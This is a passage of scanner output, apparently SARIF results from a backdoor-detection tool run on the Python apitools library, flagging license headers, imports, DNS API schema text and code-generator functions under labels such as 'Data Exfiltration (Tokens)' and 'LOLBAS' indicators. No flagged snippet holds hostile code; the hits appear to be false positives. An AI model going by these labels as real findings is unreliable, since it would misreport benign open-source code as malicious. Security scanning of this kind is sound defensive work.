                  "startLine": 16,
                  "startColumn": 7,
                  "endLine": 16,
                  "endColumn": 13,
                  "snippet": {
                    "text": "# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport base64\nimport datetime\nimport json\nimport sys\n",
                    "rendered": {
                      "text": "# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport base64\nimport datetime\nimport json\nimport sys\n",
                      "markdown": "`# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport base64\nimport datetime\nimport json\nimport sys\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/__init__.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/util_test.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 38,
                  "endLine": 7,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/__init__.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/testdata/dns/dns_v1.json"
                },
                "region": {
                  "startLine": 351,
                  "startColumn": 31,
                  "endLine": 351,
                  "endColumn": 39,
                  "snippet": {
                    "text": "     \"id\": \"dns.changes.create\",\n     \"path\": \"{project}/managedZones/{managedZone}/changes\",\n     \"httpMethod\": \"POST\",\n     \"description\": \"Atomically update the ResourceRecordSet collection.\",\n     \"parameters\": {\n      \"managedZone\": {\n       \"type\": \"string\",\n",
                    "rendered": {
                      "text": "     \"id\": \"dns.changes.create\",\n     \"path\": \"{project}/managedZones/{managedZone}/changes\",\n     \"httpMethod\": \"POST\",\n     \"description\": \"Atomically update the ResourceRecordSet collection.\",\n     \"parameters\": {\n      \"managedZone\": {\n       \"type\": \"string\",\n",
                      "markdown": "`     \"id\": \"dns.changes.create\",\n     \"path\": \"{project}/managedZones/{managedZone}/changes\",\n     \"httpMethod\": \"POST\",\n     \"description\": \"Atomically update the ResourceRecordSet collection.\",\n     \"parameters\": {\n      \"managedZone\": {\n       \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/testdata/dns/dns_v1.json"
                },
                "region": {
                  "startLine": 332,
                  "startColumn": 322,
                  "endLine": 332,
                  "endColumn": 326,
                  "snippet": {
                    "text": "he presence of this field indicates that there exist more results following your last page of results in pagination order. To fetch them, make another list request using this value as your pagination token.\\n\\nIn this way you can retrieve the complete contents of even very large collections one page at a time. However, if the contents of the collection change between the first and last paginated list request, the set of all elements returned will be an inconsistent view of the collection. There is no way to retrieve a consistent snapshot of a collection larger than the maximum page size.\"\n    },\n ",
                    "rendered": {
                      "text": "he presence of this field indicates that there exist more results following your last page of results in pagination order. To fetch them, make another list request using this value as your pagination token.\\n\\nIn this way you can retrieve the complete contents of even very large collections one page at a time. However, if the contents of the collection change between the first and last paginated list request, the set of all elements returned will be an inconsistent view of the collection. There is no way to retrieve a consistent snapshot of a collection larger than the maximum page size.\"\n    },\n ",
                      "markdown": "`he presence of this field indicates that there exist more results following your last page of results in pagination order. To fetch them, make another list request using this value as your pagination token.\\n\\nIn this way you can retrieve the complete contents of even very large collections one page at a time. However, if the contents of the collection change between the first and last paginated list request, the set of all elements returned will be an inconsistent view of the collection. There is no way to retrieve a consistent snapshot of a collection larger than the maximum page size.\"\n    },\n `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/testdata/dns/dns_v1.json"
                },
                "region": {
                  "startLine": 218,
                  "startColumn": 316,
                  "endLine": 218,
                  "endColumn": 320,
                  "snippet": {
                    "text": "n\": \"The presence of this field indicates that there exist more results following your last page of results in pagination order. To fetch them, make another list request using this value as your page token.\\n\\nIn this way you can retrieve the complete contents of even very large collections one page at a time. However, if the contents of the collection change between the first and last paginated list request, the set of all elements returned will be an inconsistent view of the collection. There is no way to retrieve a consistent snapshot of a collection larger than the maximum page size.\"\n    }\n  ",
                    "rendered": {
                      "text": "n\": \"The presence of this field indicates that there exist more results following your last page of results in pagination order. To fetch them, make another list request using this value as your page token.\\n\\nIn this way you can retrieve the complete contents of even very large collections one page at a time. However, if the contents of the collection change between the first and last paginated list request, the set of all elements returned will be an inconsistent view of the collection. There is no way to retrieve a consistent snapshot of a collection larger than the maximum page size.\"\n    }\n  ",
                      "markdown": "`n\": \"The presence of this field indicates that there exist more results following your last page of results in pagination order. To fetch them, make another list request using this value as your page token.\\n\\nIn this way you can retrieve the complete contents of even very large collections one page at a time. However, if the contents of the collection change between the first and last paginated list request, the set of all elements returned will be an inconsistent view of the collection. There is no way to retrieve a consistent snapshot of a collection larger than the maximum page size.\"\n    }\n  `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/testdata/dns/dns_v1.json"
                },
                "region": {
                  "startLine": 167,
                  "startColumn": 40,
                  "endLine": 167,
                  "endColumn": 44,
                  "snippet": {
                    "text": "    },\n    \"description\": {\n     \"type\": \"string\",\n     \"description\": \"A mutable string of at most 1024 characters associated with this resource for the user's convenience. Has no effect on the managed zone's function.\"\n    },\n    \"dnsName\": {\n     \"type\": \"string\",\n",
                    "rendered": {
                      "text": "    },\n    \"description\": {\n     \"type\": \"string\",\n     \"description\": \"A mutable string of at most 1024 characters associated with this resource for the user's convenience. Has no effect on the managed zone's function.\"\n    },\n    \"dnsName\": {\n     \"type\": \"string\",\n",
                      "markdown": "`    },\n    \"description\": {\n     \"type\": \"string\",\n     \"description\": \"A mutable string of at most 1024 characters associated with this resource for the user's convenience. Has no effect on the managed zone's function.\"\n    },\n    \"dnsName\": {\n     \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/testdata/dns/dns_v1.json"
                },
                "region": {
                  "startLine": 152,
                  "startColumn": 322,
                  "endLine": 152,
                  "endColumn": 326,
                  "snippet": {
                    "text": "he presence of this field indicates that there exist more results following your last page of results in pagination order. To fetch them, make another list request using this value as your pagination token.\\n\\nIn this way you can retrieve the complete contents of even very large collections one page at a time. However, if the contents of the collection change between the first and last paginated list request, the set of all elements returned will be an inconsistent view of the collection. There is no way to retrieve a \\\"snapshot\\\" of collections larger than the maximum page size.\"\n    }\n   }\n  },\n",
                    "rendered": {
                      "text": "he presence of this field indicates that there exist more results following your last page of results in pagination order. To fetch them, make another list request using this value as your pagination token.\\n\\nIn this way you can retrieve the complete contents of even very large collections one page at a time. However, if the contents of the collection change between the first and last paginated list request, the set of all elements returned will be an inconsistent view of the collection. There is no way to retrieve a \\\"snapshot\\\" of collections larger than the maximum page size.\"\n    }\n   }\n  },\n",
                      "markdown": "`he presence of this field indicates that there exist more results following your last page of results in pagination order. To fetch them, make another list request using this value as your pagination token.\\n\\nIn this way you can retrieve the complete contents of even very large collections one page at a time. However, if the contents of the collection change between the first and last paginated list request, the set of all elements returned will be an inconsistent view of the collection. There is no way to retrieve a \\\"snapshot\\\" of collections larger than the maximum page size.\"\n    }\n   }\n  },\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/testdata/dns/dns_v1.json"
                },
                "region": {
                  "startLine": 90,
                  "startColumn": 28,
                  "endLine": 90,
                  "endColumn": 36,
                  "snippet": {
                    "text": "  \"Change\": {\n   \"id\": \"Change\",\n   \"type\": \"object\",\n   \"description\": \"An atomic update to a collection of ResourceRecordSets.\",\n   \"properties\": {\n    \"additions\": {\n     \"type\": \"array\",\n",
                    "rendered": {
                      "text": "  \"Change\": {\n   \"id\": \"Change\",\n   \"type\": \"object\",\n   \"description\": \"An atomic update to a collection of ResourceRecordSets.\",\n   \"properties\": {\n    \"additions\": {\n     \"type\": \"array\",\n",
                      "markdown": "`  \"Change\": {\n   \"id\": \"Change\",\n   \"type\": \"object\",\n   \"description\": \"An atomic update to a collection of ResourceRecordSets.\",\n   \"properties\": {\n    \"additions\": {\n     \"type\": \"array\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/testdata/dns/dns_v1.json"
                },
                "region": {
                  "startLine": 225,
                  "startColumn": 55,
                  "endLine": 225,
                  "endColumn": 60,
                  "snippet": {
                    "text": "  \"Project\": {\n   \"id\": \"Project\",\n   \"type\": \"object\",\n   \"description\": \"A project resource. The project is a top level container for resources including Cloud DNS ManagedZones. Projects can be created only in the APIs console.\",\n   \"properties\": {\n    \"id\": {\n     \"type\": \"string\",\n",
                    "rendered": {
                      "text": "  \"Project\": {\n   \"id\": \"Project\",\n   \"type\": \"object\",\n   \"description\": \"A project resource. The project is a top level container for resources including Cloud DNS ManagedZones. Projects can be created only in the APIs console.\",\n   \"properties\": {\n    \"id\": {\n     \"type\": \"string\",\n",
                      "markdown": "`  \"Project\": {\n   \"id\": \"Project\",\n   \"type\": \"object\",\n   \"description\": \"A project resource. The project is a top level container for resources including Cloud DNS ManagedZones. Projects can be created only in the APIs console.\",\n   \"properties\": {\n    \"id\": {\n     \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/testdata/dns/dns_v1.json"
                },
                "region": {
                  "startLine": 163,
                  "startColumn": 24,
                  "endLine": 163,
                  "endColumn": 30,
                  "snippet": {
                    "text": "   \"properties\": {\n    \"creationTime\": {\n     \"type\": \"string\",\n     \"description\": \"The time that this resource was created on the server. This is in RFC3339 text format. Output only.\"\n    },\n    \"description\": {\n     \"type\": \"string\",\n",
                    "rendered": {
                      "text": "   \"properties\": {\n    \"creationTime\": {\n     \"type\": \"string\",\n     \"description\": \"The time that this resource was created on the server. This is in RFC3339 text format. Output only.\"\n    },\n    \"description\": {\n     \"type\": \"string\",\n",
                      "markdown": "`   \"properties\": {\n    \"creationTime\": {\n     \"type\": \"string\",\n     \"description\": \"The time that this resource was created on the server. This is in RFC3339 text format. Output only.\"\n    },\n    \"description\": {\n     \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/testdata/dns/dns_v1.json"
                },
                "region": {
                  "startLine": 117,
                  "startColumn": 24,
                  "endLine": 117,
                  "endColumn": 30,
                  "snippet": {
                    "text": "    },\n    \"startTime\": {\n     \"type\": \"string\",\n     \"description\": \"The time that this operation was started by the server. This is in RFC3339 text format.\"\n    },\n    \"status\": {\n     \"type\": \"string\",\n",
                    "rendered": {
                      "text": "    },\n    \"startTime\": {\n     \"type\": \"string\",\n     \"description\": \"The time that this operation was started by the server. This is in RFC3339 text format.\"\n    },\n    \"status\": {\n     \"type\": \"string\",\n",
                      "markdown": "`    },\n    \"startTime\": {\n     \"type\": \"string\",\n     \"description\": \"The time that this operation was started by the server. This is in RFC3339 text format.\"\n    },\n    \"status\": {\n     \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/testdata/dns/dns_v1.json"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 4,
                  "endLine": 46,
                  "endColumn": 14,
                  "snippet": {
                    "text": "   \"description\": \"API key. Your API key identifies your project and provides you with API access, quota, and reports. Required unless you provide an OAuth 2.0 token.\",\n   \"location\": \"query\"\n  },\n  \"oauth_token\": {\n   \"type\": \"string\",\n   \"description\": \"OAuth 2.0 token for the current user.\",\n   \"location\": \"query\"\n",
                    "rendered": {
                      "text": "   \"description\": \"API key. Your API key identifies your project and provides you with API access, quota, and reports. Required unless you provide an OAuth 2.0 token.\",\n   \"location\": \"query\"\n  },\n  \"oauth_token\": {\n   \"type\": \"string\",\n   \"description\": \"OAuth 2.0 token for the current user.\",\n   \"location\": \"query\"\n",
                      "markdown": "`   \"description\": \"API key. Your API key identifies your project and provides you with API access, quota, and reports. Required unless you provide an OAuth 2.0 token.\",\n   \"location\": \"query\"\n  },\n  \"oauth_token\": {\n   \"type\": \"string\",\n   \"description\": \"OAuth 2.0 token for the current user.\",\n   \"location\": \"query\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 441,
                  "startColumn": 36,
                  "endLine": 441,
                  "endColumn": 40,
                  "snippet": {
                    "text": "            body_field_name = self.__names.FieldName(\n                '%s_resource' % body_field_name)\n        # It's exceedingly unlikely that we'd get two name collisions, which\n        # means it's bound to happen at some point.\n        while body_field_name in method_description.get('parameters', {}):\n            body_field_name = self.__names.FieldName(\n                '%s_body' % body_field_name)\n",
                    "rendered": {
                      "text": "            body_field_name = self.__names.FieldName(\n                '%s_resource' % body_field_name)\n        # It's exceedingly unlikely that we'd get two name collisions, which\n        # means it's bound to happen at some point.\n        while body_field_name in method_description.get('parameters', {}):\n            body_field_name = self.__names.FieldName(\n                '%s_body' % body_field_name)\n",
                      "markdown": "`            body_field_name = self.__names.FieldName(\n                '%s_resource' % body_field_name)\n        # It's exceedingly unlikely that we'd get two name collisions, which\n        # means it's bound to happen at some point.\n        while body_field_name in method_description.get('parameters', {}):\n            body_field_name = self.__names.FieldName(\n                '%s_body' % body_field_name)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 448,
                  "startColumn": 20,
                  "endLine": 448,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        return body_field_name\n\n    def AddServiceFromResource(self, service_name, methods):\n        \"\"\"Add a new service named service_name with the given methods.\"\"\"\n        service_name = self.__names.CleanName(service_name)\n        method_descriptions = methods.get('methods', {})\n        method_info_map = collections.OrderedDict()\n",
                    "rendered": {
                      "text": "        return body_field_name\n\n    def AddServiceFromResource(self, service_name, methods):\n        \"\"\"Add a new service named service_name with the given methods.\"\"\"\n        service_name = self.__names.CleanName(service_name)\n        method_descriptions = methods.get('methods', {})\n        method_info_map = collections.OrderedDict()\n",
                      "markdown": "`        return body_field_name\n\n    def AddServiceFromResource(self, service_name, methods):\n        \"\"\"Add a new service named service_name with the given methods.\"\"\"\n        service_name = self.__names.CleanName(service_name)\n        method_descriptions = methods.get('methods', {})\n        method_info_map = collections.OrderedDict()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 219,
                  "startColumn": 48,
                  "endLine": 219,
                  "endColumn": 57,
                  "snippet": {
                    "text": "                client_info.client_class_name)\n        with printer.Indent():\n            printer(\n                '\"\"\"Generated client library for service %s version %s.\"\"\"',\n                client_info.package, client_info.version)\n            printer()\n            printer('MESSAGES_MODULE = messages')\n",
                    "rendered": {
                      "text": "                client_info.client_class_name)\n        with printer.Indent():\n            printer(\n                '\"\"\"Generated client library for service %s version %s.\"\"\"',\n                client_info.package, client_info.version)\n            printer()\n            printer('MESSAGES_MODULE = messages')\n",
                      "markdown": "`                client_info.client_class_name)\n        with printer.Indent():\n            printer(\n                '\"\"\"Generated client library for service %s version %s.\"\"\"',\n                client_info.package, client_info.version)\n            printer()\n            printer('MESSAGES_MODULE = messages')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 167,
                  "startColumn": 25,
                  "endLine": 167,
                  "endColumn": 34,
                  "snippet": {
                    "text": "                printer(')')\n\n    def __WriteProtoServiceDeclaration(self, printer, name, method_info_map):\n        \"\"\"Write a single service declaration to a proto file.\"\"\"\n        printer()\n        printer('service %s {', self.__GetServiceClassName(name))\n        with printer.Indent():\n",
                    "rendered": {
                      "text": "                printer(')')\n\n    def __WriteProtoServiceDeclaration(self, printer, name, method_info_map):\n        \"\"\"Write a single service declaration to a proto file.\"\"\"\n        printer()\n        printer('service %s {', self.__GetServiceClassName(name))\n        with printer.Indent():\n",
                      "markdown": "`                printer(')')\n\n    def __WriteProtoServiceDeclaration(self, printer, name, method_info_map):\n        \"\"\"Write a single service declaration to a proto file.\"\"\"\n        printer()\n        printer('service %s {', self.__GetServiceClassName(name))\n        with printer.Indent():\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 62,
                  "startColumn": 34,
                  "endLine": 62,
                  "endColumn": 43,
                  "snippet": {
                    "text": "            '%sService' % self.__names.ClassName(service_name))\n\n    def __PrintDocstring(self, printer, method_info, method_name, name):\n        \"\"\"Print a docstring for a service method.\"\"\"\n        if method_info.description:\n            description = util.CleanDescription(method_info.description)\n            first_line, newline, remaining = method_info.description.partition(\n",
                    "rendered": {
                      "text": "            '%sService' % self.__names.ClassName(service_name))\n\n    def __PrintDocstring(self, printer, method_info, method_name, name):\n        \"\"\"Print a docstring for a service method.\"\"\"\n        if method_info.description:\n            description = util.CleanDescription(method_info.description)\n            first_line, newline, remaining = method_info.description.partition(\n",
                      "markdown": "`            '%sService' % self.__names.ClassName(service_name))\n\n    def __PrintDocstring(self, printer, method_info, method_name, name):\n        \"\"\"Print a docstring for a service method.\"\"\"\n        if method_info.description:\n            description = util.CleanDescription(method_info.description)\n            first_line, newline, remaining = method_info.description.partition(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 35,
                  "startColumn": 19,
                  "endLine": 35,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\nclass ServiceRegistry(object):\n\n    \"\"\"Registry for service types.\"\"\"\n\n    def __init__(self, client_info, message_registry,\n                 names, root_package, base_files_package,\n",
                    "rendered": {
                      "text": "\nclass ServiceRegistry(object):\n\n    \"\"\"Registry for service types.\"\"\"\n\n    def __init__(self, client_info, message_registry,\n                 names, root_package, base_files_package,\n",
                      "markdown": "`\nclass ServiceRegistry(object):\n\n    \"\"\"Registry for service types.\"\"\"\n\n    def __init__(self, client_info, message_registry,\n                 names, root_package, base_files_package,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 480,
                  "startColumn": 33,
                  "endLine": 480,
                  "endColumn": 38,
                  "snippet": {
                    "text": "            method_info_map[method_name] = self.__ComputeMethodInfo(\n                method_description, request, response, request_field)\n\n        nested_services = methods.get('resources', {})\n        services = sorted(nested_services.items())\n        for subservice_name, submethods in services:\n            new_service_name = '%s_%s' % (service_name, subservice_name)\n",
                    "rendered": {
                      "text": "            method_info_map[method_name] = self.__ComputeMethodInfo(\n                method_description, request, response, request_field)\n\n        nested_services = methods.get('resources', {})\n        services = sorted(nested_services.items())\n        for subservice_name, submethods in services:\n            new_service_name = '%s_%s' % (service_name, subservice_name)\n",
                      "markdown": "`            method_info_map[method_name] = self.__ComputeMethodInfo(\n                method_description, request, response, request_field)\n\n        nested_services = methods.get('resources', {})\n        services = sorted(nested_services.items())\n        for subservice_name, submethods in services:\n            new_service_name = '%s_%s' % (service_name, subservice_name)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
